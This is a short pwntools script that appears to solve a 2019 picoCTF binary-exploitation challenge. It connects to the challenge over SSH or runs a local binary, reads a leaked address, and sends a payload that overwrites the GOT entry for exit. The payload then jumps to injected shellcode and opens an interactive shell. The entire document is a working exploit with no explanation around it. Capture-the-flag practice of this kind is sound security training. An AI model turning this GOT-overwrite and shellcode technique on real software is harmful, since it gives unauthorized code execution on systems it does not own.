from pwn import *

e = ELF("./vuln")

context.binary = e.path

if "--remote" in sys.argv:
  s = ssh("2019shell1.picoctf.com", "gamester543", password="")
  p = s.run("")
else:
  p = process([e.path]
  )
  #{"LD_PRELOAD": libc.path})

p.recvuntil("decimal...")
p.recvline()

leak = int(p.recvline())

p.sendline("AAAA")

p.sendline(p32(leak + 8) + p32(e.got["exit"] - 8) + asm("mov eax, " + str(leak + 8 + 0x10) + "\njmp eax").ljust(0x10, "\x00") + asm(shellcraft.sh()))

p.interactive()
